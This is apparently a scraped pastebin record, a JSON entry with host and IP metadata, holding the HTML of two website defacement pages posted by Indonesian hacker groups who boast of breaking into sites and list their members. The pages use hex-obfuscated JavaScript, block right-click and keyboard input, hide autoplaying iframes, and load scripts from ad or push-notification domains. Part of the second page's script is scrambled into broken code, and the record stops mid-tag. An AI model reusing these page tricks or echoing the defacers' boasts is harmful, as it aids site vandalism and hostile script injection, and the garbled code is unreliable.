type=\"text\/rocketscript\">\r\nvar _0x3b2b=[\"\\x63\",\"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\",\"\\x32\\x64\",\"\\x67\\x65\\x74\\x43\\x6F\\x6E\\x74\\x65\\x78\\x74\",\"\\x68\\x65\\x69\\x67\\x68\\x74\",\"\\x69\\x6E\\x6E\\x65\\x72\\x48\\x65\\x69\\x67\\x68\\x74\",\"\\x77\\x69\\x64\\x74\\x68\",\"\\x69\\x6E\\x6E\\x65\\x72\\x57\\x69\\x64\\x74\\x68\",\"\\x31\\x31\\x30\\x31\\x30\\x31\\x30\\x30\\x31\\x30\\x31\",\"\",\"\\x73\\x70\\x6C\\x69\\x74\",\"\\x66\\x69\\x6C\\x6C\\x53\\x74\\x79\\x6C\\x65\",\"\\x72\\x67\\x62\\x61\\x28\\x30\\x2C\\x34\\x33\\x2C\\x35\\x34\\x2C\\x30\\x2E\\x31\\x29\",\"\\x66\\x69\\x6C\\x6C\\x52\\x65\\x63\\x74\",\"\\x23\\x32\\x36\\x39\\x31\\x38\\x36\",\"\\x66\\x6F\\x6E\\x74\",\"\\x70\\x78\\x20\\x61\\x72\\x69\\x61\\x6C\",\"\\x6C\\x65\\x6E\\x67\\x74\\x68\",\"\\x72\\x61\\x6E\\x64\\x6F\\x6D\",\"\\x66\\x6C\\x6F\\x6F\\x72\",\"\\x66\\x69\\x6C\\x6C\\x54\\x65\\x78\\x74\"];\r\nvar c=document[_0x3b2b[1]](_0x3b2b[0]);\r\nvar ctx=c[_0x3b2b[3]](_0x3b2b[2]);c[_0x3b2b[4]]=window[_0x3b2b[5]];c[_0x3b2b[6]]=window[_0x3b2b[7]];\r\nvar chinese=_0x3b2b[8];chinese=chinese[_0x3b2b[10]](_0x3b2b[9]);\r\nvar font_size=10;var columns=c[_0x3b2b[6]]\/font_size;\r\nvar drops=[];\r\nfor(var x=0;x<columns;x++){drops[x]=1};\r\nfunction draw(){ctx[_0x3b2b[11]]=_0x3b2b[12];ctx[_0x3b2b[13]](0,0,c[_0x3b2b[6]],c[_0x3b2b[4]]);ctx[_0x3b2b[11]]=_0x3b2b[14];ctx[_0x3b2b[15]]=font_size+_0x3b2b[16];\r\nfor(var _0xfbc6x9=0;_0xfbc6x9<drops[_0x3b2b[17]];_0xfbc6x9++){var _0xfbc6xa=chinese[Math[_0x3b2b[19]](Math[_0x3b2b[18]]()*chinese[_0x3b2b[17]])];ctx[_0x3b2b[20]](_0xfbc6xa,_0xfbc6x9*font_size,drops[_0xfbc6x9]*font_size);\r\nif(drops[_0xfbc6x9]*font_size>c[_0x3b2b[4]]&&Math[_0x3b2b[18]]()>0.975){drops[_0xfbc6x9]=0};drops[_0xfbc6x9]++;};}setInterval(draw,33);\r\nvar _0xc6fc=[\"\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\",\"\\x75\\x6E\\x64\\x65\\x66\\x69\\x6E\\x65\\x64\",\"\\x69\\x6E\\x6E\\x65\\x72\\x48\\x54\\x4D\\x4C\",\"\\x72\\x75\\x6E\\x6E\\x69\\x6E\\x67\",\"\\x65\\x6C\\x65\\x6D\\x65\\x6E\\x74\",\"\\x66\\x69\\x6E\\x69\\x73\\x68\\x65\\x64\\x43\\x61\\x6C\\x6C\\x62\\x61\\x63\\x6B\",\"\\x69\\x6E\\x74\\x65\\x72\\x76\\x61\\x6C\",\"\\x6F\\x72\\x69\\x67\\x54\\x65\\x78\\x74\",\"\\x75\\x6E\\x70\\x61\\x72\\x73\\x65\\x64\\x4F\\x72\\x69\\x67\\x54\\x65\\x78\\x74\",\"\\x63\\x75\\x72\\x73\\x6F\\x72\",\"\",\"\\x63\\x75\\x72\\x72\\x65\\x6E\\x74\\x54\\x65\\x78\\x74\",\"\\x63\\x75\\x72\\x72\\x65\\x6E\\x74\\x43\\x68\\x61\\x72\",\"\\x74\\x79\\x70\\x69\\x6E\\x67\\x54\\x65\\x78\\x74\",\"\\x69\\x64\",\"\\x74\\x79\\x70\\x69\\x6E\\x67\\x74\\x65\\x78\\x74\",\"\\x63\\x75\\x72\\x72\\x65\\x6E\\x74\\x49\\x6E\\x64\\x65\\x78\",\"\\x70\\x75\\x73\\x68\",\"\\x61\\x6C\\x6C\",\"\\x69\\x6E\\x54\\x61\\x67\",\"\\x74\\x61\\x67\\x42\\x75\\x66\\x66\\x65\\x72\",\"\\x69\\x6E\\x48\\x54\\x4D\\x4C\\x45\\x6E\\x74\\x69\\x74\\x79\",\"\\x48\\x54\\x4D\\x4C\\x45\\x6E\\x74\\x69\\x74\\x79\\x42\\x75\\x66\\x66\\x65\\x72\",\"\\x72\\x75\\x6E\\x41\\x6C\\x6C\",\"\\x6C\\x65\\x6E\\x67\\x74\\x68\",\"\\x72\\x75\\x6E\",\"\\x70\\x72\\x6F\\x74\\x6F\\x74\\x79\\x70\\x65\",\"\\x64\\x6F\\x63\\x75\\x6D\\x65\\x6E\\x74\\x2E\\x67\\x65\\x74\\x45\\x6C\\x65\\x6D\\x65\\x6E\\x74\\x42\\x79\\x49\\x64\\x28\\x27\",\"\\x27\\x29\\x2E\\x74\\x79\\x70\\x69\\x6E\\x67\\x54\\x65\\x78\\x74\\x2E\\x72\\x75\\x6E\\x28\\x29\",\"\\x63\\x68\\x61\\x72\\x41\\x74\",\"\\x3C\",\"\\x3E\",\"\\x26\",\"\\x3B\",\"\\x66\\x75\\x6E\\x63\\x74\\x69\\x6F\\x6E\"];TypingText=function(_0x3f72x1,_0x3f72x2,_0x3f72x3,_0x3f72x4){if(( typeof document[_0xc6fc[0]]==_0xc6fc[1])||( typeof _0x3f72x1[_0xc6fc[2]]==_0xc6fc[1])){this[_0xc6fc[3]]=true;return ;};this[_0xc6fc[4]]=_0x3f72x1;this[_0xc6fc[5]]=(_0x3f72x4?_0x3f72x4:function(){return });this[_0xc6fc[6]]=( typeof _0x3f72x2==_0xc6fc[1]?1:_0x3f72x2);this[_0xc6fc[7]]=this[_0xc6fc[4]][_0xc6fc[2]];this[_0xc6fc[8]]=this[_0xc6fc[7]];this[_0xc6fc[9]]=(_0x3f72x3?_0x3f72x3:_0xc6fc[10]);this[_0xc6fc[11]]=_0xc6fc[10];this[_0xc6fc[12]]=0;this[_0xc6fc[4]][_0xc6fc[13]]=this;if(this[_0xc6fc[4]][_0xc6fc[14]]==_0xc6fc[10]){this[_0xc6fc[4]][_0xc6fc[14]]=_0xc6fc[15]+TypingText[_0xc6fc[16]]++};TypingText[_0xc6fc[18]][_0xc6fc[17]](this);this[_0xc6fc[3]]=false;this[_0xc6fc[19]]=false;this[_0xc6fc[20]]=_0xc6fc[10];this[_0xc6fc[21]]=false;this[_0xc6fc[22]]=_0xc6fc[10];};TypingText[_0xc6fc[18]]= new Array();TypingText[_0xc6fc[16]]=0;TypingText[_0xc6fc[23]]=function(){for(var _0x3f72x5=0;_0x3f72x5<TypingText[_0xc6fc[18]][_0xc6fc[24]];_0x3f72x5++){TypingText[_0xc6fc[18]][_0x3f72x5][_0xc6fc[25]]()}};TypingText[_0xc6fc[26]][_0xc6fc[25]]=function(){if(this[_0xc6fc[3]]){return };if( typeof this[_0xc6fc[7]]==_0xc6fc[1]){setTimeout(_0xc6fc[27]+this[_0xc6fc[4]][_0xc6fc[14]]+_0xc6fc[28],this[_0xc6fc[6]]);return ;};if(this[_0xc6fc[11]]==_0xc6fc[10]){this[_0xc6fc[4]][_0xc6fc[2]]=_0xc6fc[10]};if(this[_0xc6fc[12]]<this[_0xc6fc[7]][_0xc6fc[24]]){if(this[_0xc6fc[7]][_0xc6fc[29]](this[_0xc6fc[12]])==_0xc6fc[30]&&!this[_0xc6fc[19]]){this[_0xc6fc[20]]=_0xc6fc[30];this[_0xc6fc[19]]=true;this[_0xc6fc[12]]++;this[_0xc6fc[25]]();return ;}else {if(this[_0xc6fc[7]][_0xc6fc[29]](this[_0xc6fc[12]])==_0xc6fc[31]&&this[_0xc6fc[19]]){this[_0xc6fc[20]]+=_0xc6fc[31];this[_0xc6fc[19]]=false;this[_0xc6fc[11]]+=this[_0xc6fc[20]];this[_0xc6fc[12]]++;this[_0xc6fc[25]]();return ;}else {if(this[_0xc6fc[19]]){this[_0xc6fc[20]]+=this[_0xc6fc[7]][_0xc6fc[29]](this[_0xc6fc[12]]);this[_0xc6fc[12]]++;this[_0xc6fc[25]]();return ;}else {if(this[_0xc6fc[7]][_0xc6fc[29]](this[_0xc6fc[12]])==_0xc6fc[32]&&!this[_0xc6fc[21]]){this[_0xc6fc[22]]=_0xc6fc[32];this[_0xc6fc[21]]=true;this[_0xc6fc[12]]++;this[_0xc6fc[25]]();return ;}else {if(this[_0xc6fc[7]][_0xc6fc[29]](this[_0xc6fc[12]])==_0xc6fc[33]&&this[_0xc6fc[21]]){this[_0xc6fc[22]]+=_0xc6fc[33];this[_0xc6fc[21]]=false;this[_0xc6fc[11]]+=this[_0xc6fc[22]];this[_0xc6fc[12]]++;this[_0xc6fc[25]]();return ;}else {if(this[_0xc6fc[21]]){this[_0xc6fc[22]]+=this[_0xc6fc[7]][_0xc6fc[29]](this[_0xc6fc[12]]);this[_0xc6fc[12]]++;this[_0xc6fc[25]]();return ;}else {this[_0xc6fc[11]]+=this[_0xc6fc[7]][_0xc6fc[29]](this[_0xc6fc[12]])}}}}}};this[_0xc6fc[4]][_0xc6fc[2]]=this[_0xc6fc[11]];this[_0xc6fc[4]][_0xc6fc[2]]+=(this[_0xc6fc[12]]<this[_0xc6fc[7]][_0xc6fc[24]]-1?( typeof this[_0xc6fc[9]]==_0xc6fc[34]?this[_0xc6fc[9]](this[_0xc6fc[11]]):this[_0xc6fc[9]]):_0xc6fc[10]);this[_0xc6fc[12]]++;setTimeout(_0xc6fc[27]+this[_0xc6fc[4]][_0xc6fc[14]]+_0xc6fc[28],this[_0xc6fc[6]]);}else {this[_0xc6fc[11]]=_0xc6fc[10];this[_0xc6fc[12]]=0;this[_0xc6fc[3]]=false;this[_0xc6fc[5]]();};};\r\nnew TypingText(document.getElementById(\"TypeText\"), 50, function(i){ var ar\r\n= new Array(\"|\", \"|\", \"|\", \"|\"); return \" \" + ar[i.length % ar.length]; });\r\nTypingText.runAll();\r\n<\/script>\r\n<script language=\"JavaScript\" type=\"text\/rocketscript\">\r\ndocument.oncontextmenu =new Function(\"return false;\")\r\n<\/script>\r\n<div id=\"shadow\" class=\"shadow\">\r\n <br><br><br> <br><br>\r\n<img src='https:\/\/2.bp.blogspot.com\/-o0GdMyEh9lw\/WG_hVTWZQMI\/AAAAAAAAAwU\/C8VAtiqZSnEo6O_k6vH8ZrYLprE07s0LgCLcB\/s1600\/N45HT%2B%25282%2529.png' style=\"opacity:0.4;filter:alpha(opacity=40)\" height=300 width=300><br>\r\n<font face=\"Nova Square\" color=\"grey\" size=\"4px\"> Hacked Mr.x0x <\/font><br>\r\n<font face=\"Nova Square\" color=\"grey\" size=\"2px\">\r\n<br> -= Nusantara Hacker Team =-\r\n<br>\r\n<br>\r\n<br>\r\n-= ShinChan ~ SCYTHE404_LOL ~ PETR03X ~ FRU_403 ~ VrCy ~ Mr.x0x ~ <a class=\"__cf_email__\" href=\"\/cdn-cgi\/l\/email-protection\" data-cfemail=\"d8aae8e8ef98adb6b3b6e8afb6\">[email&#160;protected]<\/a><script data-cfhash='f9e31' type=\"text\/javascript\">\/* <![CDATA[ *\/!function(t,e,r,n,c,a,p){try{t=document.currentScript||function(){for(t=document.getElementsByTagName('script'),e=t.length;e--;)if(t[e].getAttribute('data-cfhash'))return t[e]}();if(t&&(c=t.previousSibling)){p=t.parentNode;if(a=c.getAttribute('data-cfemail')){for(e='',r='0x'+a.substr(0,2)|0,n=2;a.length-n;n+=2)e+='%'+('0'+('0x'+a.substr(n,2)^r).toString(16)).slice(-2);p.replaceChild(document.createTextNode(decodeURIComponent(e)),c)}p.removeChild(t)}}catch(u){}}()\/* ]]> *\/<\/script> ~ Noob_Orb ~ siluman.nanas ~ BangDebbz =-<br>\r\n<\/div>\r\n<iframe src='https:\/\/www.youtube.com\/embed\/9ImoE5ELehA?autoplay=1&loop=1' allowfullscreen=' frameborder='0' height='0' width='0'><\/iframe>\r\n \r\n \r\n<div id=\"om-q3j4zia3wz1d4vjb-holder\"><\/div><script type=\"text\/rocketscript\">var q3j4zia3wz1d4vjb,q3j4zia3wz1d4vjb_poll=function(){var r=0;return function(n,l){clearInterval(r),r=setInterval(n,l)}}();!function(e,t,n){if(e.getElementById(n)){q3j4zia3wz1d4vjb_poll(function(){if(window[\"om_loaded\"]){if(!q3j4zia3wz1d4vjb){q3j4zia3wz1d4vjb=new OptinMonsterApp();return q3j4zia3wz1d4vjb.init({\"u\":\"13439.483591\",\"staging\":0,\"dev\":0,\"beta\":0});}}},25);return;}var d=false,o=e.createElement(t);o.id=n,o.src=\"\/\/a.optnmnstr.com\/app\/js\/api.min.js\",o.async=true,o.onload=o.onreadystatechange=function(){if(!d){if(!this.readyState||this.readyState===\"loaded\"||this.readyState===\"complete\"){try{d=om_loaded=true;q3j4zia3wz1d4vjb=new OptinMonsterApp();q3j4zia3wz1d4vjb.init({\"u\":\"13439.483591\",\"staging\":0,\"dev\":0,\"beta\":0});o.onload=o.onreadystatechange=null;}catch(t){}}}};(document.getElementsByTagName(\"head\")[0]||document.documentElement).appendChild(o)}(document,\"script\",\"omapi-script\");<\/script><\/body>\r\n<\/html><!-- --> <script type=\"text\/rocketscript\" data-rocketsrc='\/\/go.pub2srv.com\/apu.php?zoneid=16780'> <\/script> <script type=\"text\/rocketscript\" data-rocketsrc=\"\/\/1phads.com\/notice.php?p=16781&interactive=1&pushup=1\"> <\/script>","domain":["1e100.net","gstatic.com","googleapis.com","youtube.com","blogspot.com"],"file":["notice.php","apu.php","document.doc"],"host":["par10s34-in-f14","par21s12-in-f9","par10s29-in-f1","par10s28-in-f110","par21s17-in-f14","2","par10s33-in-f14","ams17s01-in-f3","fra02s28-in-f3","par10s29-in-x04","par10s29-in-x01","ams16s29-in-x0e","par21s12-in-f10","par21s07-in-f14","par10s28-in-x0e","par10s29-in-f225","par10s38-in-f14","www","par21s06-in-f14","wo-in-x5f","ams16s29-in-x03","par21s11-in-f14","par21s05-in-f14","4","par21s03-in-f14","par21s06-in-f238","par21s12-in-f14","fonts","par21s12-in-f4","par10s27-in-x03","par10s27-in-f206","ams16s32-in-f1","par21s03-in-f142","par10s29-in-f14","ams16s29-in-f3","ams16s29-in-f35","fra02s18-in-f14","ams17s01-in-x01","par21s05-in-f142","par10s27-in-f14","par10s28-in-f14","par10s29-in-f238","ams15s21-in-x09","ham02s14-in-f206"],"hostname":["www.youtube.com","par21s05-in-f142.1e100.net","par21s12-in-f4.1e100.net","par10s27-in-f14.1e100.net","par10s27-in-f206.1e100.net","ams16s29-in-x03.1e100.net","par10s29-in-f238.1e100.net","wo-in-x5f.1e100.net","par21s05-in-f14.1e100.net","2.bp.blogspot.com","par21s07-in-f14.1e100.net","ams15s21-in-x09.1e100.net","par21s17-in-f14.1e100.net","par10s29-in-f14.1e100.net","par21s03-in-f14.1e100.net","par10s27-in-x03.1e100.net","par10s28-in-f14.1e100.net","par21s06-in-f14.1e100.net","fra02s18-in-f14.1e100.net","ams16s29-in-f35.1e100.net","par10s28-in-x0e.1e100.net","par21s12-in-f14.1e100.net","ams16s29-in-f3.1e100.net","ams16s32-in-f1.1e100.net","fonts.gstatic.com","par10s38-in-f14.1e100.net","par10s29-in-x01.1e100.net","par10s29-in-f225.1e100.net","par10s33-in-f14.1e100.net","par21s12-in-f9.1e100.net","4.bp.blogspot.com","par10s29-in-f1.1e100.net","par10s28-in-f110.1e100.net","par21s12-in-f10.1e100.net","par21s06-in-f238.1e100.net","fonts.googleapis.com","par21s03-in-f142.1e100.net","par10s29-in-x04.1e100.net","par21s11-in-f14.1e100.net","ams17s01-in-f3.1e100.net","fra02s28-in-f3.1e100.net","ham02s14-in-f206.1e100.net","par10s34-in-f14.1e100.net","ams17s01-in-x01.1e100.net","ams16s29-in-x0e.1e100.net"],"ip":["2a00:1450:400e:804:0:0:0:2003","2a00:1450:400c:c07:0:0:0:5f","216.58.204.142","216.58.213.142","216.58.204.238","216.58.215.46","172.217.22.138","172.217.22.132","2a00:1450:400e:80b:0:0:0:2001","172.217.19.238","216.58.201.238","172.217.22.142","2a00:1450:4007:80f:0:0:0:2001","216.58.206.238","216.58.209.238","172.217.168.193","172.217.20.99","216.58.205.14","172.217.18.206","2a00:1450:4007:80a:0:0:0:200e","172.217.22.137","2a00:1450:4007:80f:0:0:0:2004","216.58.209.225","2a00:1450:4007:809:0:0:0:2003","2a00:1450:400e:800:0:0:0:2009","216.58.204.110","2a00:1450:400e:804:0:0:0:200e","172.217.17.35","216.58.198.206"],"key":"2Am0rdis","scheme":["https","http"],"seen_date":"2018-11-16","size":"11010","source":"pastebin","subdomains":"bp.blogspot.com","syntax":"text","tld":["com","net"],"url":["https:\/\/www.youtube.com\/embed\/9ImoE5ELehA?autoplay=1&loop=1","https:\/\/4.bp.blogspot.com\/-bB4KCjP2TaU\/WJ-i-v7p8KI\/AAAAAAAABCs\/U13xOZgij2Q0HAvlgDKzUmC4aTO57nkgACLcB\/s1600\/jj.png","https:\/\/fonts.googleapis.com\/css?family=Bungee+Shade","http:\/\/fonts.gstatic.com\/s\/orbitron\/v7\/Y82YH_MJJWnsH2yUA5AuYY4P5ICox8Kq3LLUNMylGO4.woff2","https:\/\/2.bp.blogspot.com\/-o0GdMyEh9lw\/WG_hVTWZQMI\/AAAAAAAAAwU\/C8VAtiqZSnEo6O_k6vH8ZrYLprE07s0LgCLcB\/s1600\/N45HT"]},{"@category":"pastries","@timestamp":"2018-11-16T22:48:52.000Z","@type":"doc","content":"<!DOCTYPE html>\r\n<html>\t\r\n<!--------------------------------------------\r\nHakced By ML7C\r\n4ever only mail, ml7c.gov@gmail.com\r\nno fb, no tweet, and also no other\r\n2016 - now, indonesia\r\n--------------------------------------------->\r\n<head>\r\n<title><\/ PhantomGhost >[!] ML7C [!]<\/title>\r\n<link rel=\"SHORTCUT ICON\" href=\"https:\/\/s31.postimg.org\/lkts687vf\/ade.png\">\r\n<link href=\"http:\/\/fonts.googleapis.com\/css?family=Orbitron:400:700\" rel=\"stylesheet\" type=\"text\/css\">\r\n<meta name=\"Author\" content=\"ML7C Was Here | PhantomGhost\"\/>\r\n<meta name=\"copyright\" content=\"ML7C Was Here | PhantomGhost\"\/>\r\n<meta name=\"description\" content=\"[ SECURITY IS JUST AN ILLUSION ]\"\/>\r\n<meta name=\"keywords\" content=\"Sorry Admin , Your Security Tested By PhantomGhost | ML7C\"\/>\r\n<meta property=\"og:title\" content=\"PhantomGhost | ML7C\"\/>\r\n<meta property=\"og:image\" content=\"https:\/\/s31.postimg.org\/lkts687vf\/ade.png\">\r\n<meta property=\"og:image:width \" content=\"800\">\r\n<meta property=\"og:image:height\" content=\"500\">\r\n<script src=\"http:\/\/ajax.googleapis.com\/ajax\/libs\/jquery\/1.9.1\/jquery.min.js\"><\/script>\r\n<script type=\"text\/javascript\" src=\"http:\/\/smilenet4u.googlecode.com\/files\/TipingText.js\"><\/script>\r\n<script type=\"text\/javascript\" src=\"https:\/\/dl.dropboxusercontent.com\/s\/27qrxwqx674059d\/jquery-1.11.1.min.js\"><\/script>\r\n<script type=\"text\/javascript\" src=\"https:\/\/dl.dropboxusercontent.com\/s\/yzmc24cuj9dl8ih\/bootstrap.min.js\"><\/script>\r\n<script type=\"text\/javascript\" src=\"https:\/\/dl.dropboxusercontent.com\/s\/is1vrbl5jmdsel9\/jquery.backstretch.min.js\"><\/script>\r\n<script type=\"text\/javascript\" src=\"https:\/\/dl.dropboxusercontent.com\/s\/geo5dr110vx63cl\/scripts.js\"><\/script>\r\n<iframe width=\"1\" height=\"1\" src=\"http:\/\/www.youtube.com\/embed\/7TvrvC_Si8E?rel=0&autoplay=1&loop=1&playlist=\" frameborder=\"0\" allowfullscreen><\/iframe>\r\n<\/head>\r\n<style>\r\n*{\r\n\tmargin-top:1px;\r\n}\r\nbody{\r\n    background-position: center;\r\n\tbackground-color:#000000;\r\n    height:120%;\r\n    width:99%;\r\n    background-attachment: fixed;\r\n    background-size:100% 140%;\r\n\tbackground-image:url('https:\/\/static.hummingbird.me\/anime\/cover_images\/000\/007\/714\/thumb\/Kyoukai-no-Kanata-image-kyoukai-no-kanata-36228551-1920-1080.jpg?1417877750');\r\n\tcursor: url(http:\/\/cur.cursors-4u.net\/cursors\/cur-9\/cur862.ani), url(http:\/\/cur.cursors-4u.net\/cursors\/cur-9\/cur862.png), progress !important;\r\n}\r\nh1{\r\n\tfont-family:Orbitron;\r\n\tcolor:#FFFFFF;\r\n\ttext-shadow: 0 0 3px black, 0px 0px 20px black;\r\n}\r\n#plate{\r\n    position: absolute;!important;\r\n    top:0!important;\r\n    left:0;\r\n    right:0;\r\n    width:100%;\r\n    height:100%;\r\n    z-index:-1 !important;\r\n    margin:0;\r\n    padding:0;\r\n    position:fixed;\r\n\tbackground-color:rgba(0, 0, 0, 0.18);\r\n}\r\nh2{\r\n    font-family:Orbitron;\r\n    \/*color:#A50604;*\/\r\n    color:#000000;\r\n    text-shadow: 0 0 3px white, 0px 0px 30px red;\r\n    font-size: 140%;\r\n}\r\nh1{\r\n    font-family:Orbitron;\r\n    \/*color:#A50604;*\/\r\n    color:#000000;\r\n    text-shadow: 0 0 3px white, 0px 0px 30px red;\r\n    font-size: 140%;\r\n}\r\n#foter {\r\n    position: fixed;\r\n    left: 0px;\r\n    right: 0px;\r\n    bottom: 3px;\r\n    background: transparent;\r\n    text-align: center;\r\n}\r\n#loadshit{\r\n\tbackground:#000 url(http:\/\/orig01.deviantart.net\/89a8\/f\/2016\/245\/d\/2\/phantomghost_new_logo_by_4prili666h05t-dag6ket.jpg) no-repeat center center;\r\n\theight:100%;\r\n\twidth:100%;\r\n\tbackground-size:100% 100%;\r\n\tposition:fixed;\r\n\ttop:0;\r\n\tleft:0;\r\n}\r\n.foter {\r\n    font-family:Orbitron;\r\n    color: #FFFFFF;\r\n    font-size: 10px;\r\n    text-transform: uppercase;\r\n    text-shadow: 0px 0px 10px white;\r\n}\r\n.foter span{\r\n\ttext-align: center;\r\n    font-family: Orbitron;\r\n    font-size: 300%;\r\n    color: #A50604;\r\n    text-shadow: 0 0 3px black, 0px 0px 30px red;\r\n}\r\nh3{\r\n    font-family:Orbitron;\r\n    \/*color:#A50604;*\/\r\n    color:#000000;\r\n    text-shadow: 0 0 3px white, 0px 0px 30px red;\r\n    font-size: 140%;\r\n}\r\n#cover{\r\n\theight:100%;\r\n\twidth:100%;\r\n\tposition:fixed;\r\n}\r\n#sec span{\r\n\ttext-align: center;\r\n    font-family: 'Courier New';\r\n    font-size: 300%;\r\n    color: #A50604;\r\n    text-shadow: 0 0 3px black, 0px 0px 30px red;\r\n}\r\n#sec:hover{\r\n\tcolor:#000000;\r\n\ttext-shadow: 0 0 3px white, 0px 0px 30px red;\r\n}\r\n#icon{\r\n    width: 20%;\r\n}\r\n<\/style>\r\n<script type=\"text\/javascript\">\r\n\r\n    function disableselect(e) {\r\n        return false\r\n    }\r\n\r\n    function reEnable() {\r\n            return true\r\n        }\r\n        \/\/if IE4+\r\n    document.onselectstart = new Function(\"return false\")\r\n        \/\/if NS6\r\n    if (window.sidebar) {\r\n        document.onmousedown = disableselect\r\n        document.onclick = reEnable\r\n    }\r\n\r\n    var message = \"\";\r\n\r\n    function clickIE() {\r\n        if (document.all) {\r\n            (message);\r\n            return false;\r\n        }\r\n    }\r\n\r\n    function clickNS(e) {\r\n        if (document.layers || (document.getElementById && !document.all)) {\r\n            if (e.which == 2 || e.which == 3) {\r\n                (message);\r\n                return false; = clickNS;\r\n        document.oncontextmenu = clickIE;\r\n    }\r\n    document.onco\r\n            }\r\n        }\r\n    }\r\n    if (document.layers) {\r\n        document.captureEvents(Event.MOUSEDOWN);\r\n        document.onmousedown = clickNS;\r\n    } else {\r\n        document.onmouseupntextmenu = new Function(\"return false\")\r\n<\/script>\r\n<body oncontextmenu=\"return false\" onkeydown=\"return false\" onmousedown=\"return false\">\r\n<div id=\"loadshit\">\r\n<\/div>\r\n<div id=\"cover\"><\/div>\r\n<div id=\"plate\">\r\n<canvas height=\"100%\" width=\"100%\" id=\"gravity\">LOLOLO<\/canvas> <\/div>\r\n<center>\r\n<br \/>\r\n<h1><span style=\"font-size:50px;\">&#134;<\/span> <img id=\"icon\" src=\"http:\/\/orig15.deviantart.net\/3286\/f\/2016\/284\/c\/6\/c6d978e2fdd43c77f3a6a2dfc5b67ccc-dakmqgn.png\"><span style=\"font-size:50px;\">&#134;<\/span><\/h1>\r\n<h2>Hacked By ML7C<\/h2>\r\n<h3>of<\/h3>\r\n<h1>PhantomGhost<\/h1>\r\n<\/center>\r\n<div id=\"foter\" class=\"foter\">\r\n<span id=\"PhantomGhost\">[<\/span><span id=\"sec\"> #<\/span><span id=\"sec\">O<\/span><span id=\"sec\">P<\/span><span id=\"sec\">P<\/span><span id=\"sec\">A<\/span><span id=\"sec\">Y<\/span><span id=\"sec\">B<\/span><span id=\"sec\">A<\/span><span id=\"sec\">C<\/span><span id=\"sec\">K<\/span><span id=\"sec\"> #<\/span><span id=\"sec\">F<\/span><span id=\"sec\">R<\/span><span id=\"sec\">E<\/span><span id=\"sec\">E<\/span><span id=\"sec\">K<\/span><span id=\"sec\">A<\/span><span id=\"sec\">S<\/span><span id=\"sec\">H<\/span><span id=\"sec\">M<\/span><span id=\"sec\">I<\/span><span id=\"sec\">R<\/span><span id=\"sec\"> ]<\/span><br><br>\r\n<font color=\"red\">-<\/font>:<font color=\"red\">-<\/font><img src=\"http:\/\/orig15.deviantart.net\/3286\/f\/2016\/284\/c\/6\/c6d978e2fdd43c77f3a6a2dfc5b67ccc-dakmqgn.png\" width=\"2%\"><b>Official Member<\/b><img src=\"http:\/\/orig15.deviantart.net\/3286\/f\/2016\/284\/c\/6\/c6d978e2fdd43c77f3a6a2dfc5b67ccc-dakmqgn.png\" width=\"2%\"><font color=\"red\">-<\/font>:<font color=\"red\">-<\/font><br>\r\n&#134;<marquee behavior=\"scroll\" direction=\"left\" scrollamount=\"4\" scrolldelay=\"55\" width=\"75%\"><font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> 4prili666h05T <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> BlackBurn <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> Mr.Aljabar <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> ML7C <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> Mr.3RR0R <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> gekikara404 <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> KidSZonk <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> Alternation <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> MR.WWW <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> 0x1958 <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> Alfarizi_404 <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> Exect1337 <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> D4RKNE55 <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> BabyGhost <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> CCOCOT <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> al-vri <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> .\/Mr.greetz69 <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> Fuss <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font>.\/Mr.AdsJr404\r\n <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font><\/marquee>&#134;<br><br>\r\n<font color=\"red\">-<\/font>:<font color=\"red\">-<\/font><img src=\"https:\/\/s31.postimg.org\/lkts687vf\/ade.png\" width=\"2%\"><b>Greatz<\/b><img src=\"https:\/\/s31.postimg.org\/lkts687vf\/ade.png\" width=\"2%\"><font color=\"red\">-<\/font>:<font color=\"red\">-<\/font><br>\r\n&#134;<marquee behavior=\"scroll\" direction=\"left\" scrollamount=\"4\" scrolldelay=\"55\" width=\"75%\"><font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> Tomhawk404 <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> Jancok Security <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> Phoenix Team <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> Java Intelegent Security <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> Haxor Hussy <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> Mr.DreamX169 <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> AnoaGhost <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> Dev <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> .\/R015 <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> Smile81 <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> Mr.K <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> S4bun <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> Xaveroz_Tersakiti <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> XnonGermX <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> 0x1999 <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> Aris Dot ID <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> .\/r0cky_n00bz <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> Magic_404 <font color=\"red\">-<\/font>:<font color=\"red\">-<\/font> Mr.BucketHead <font 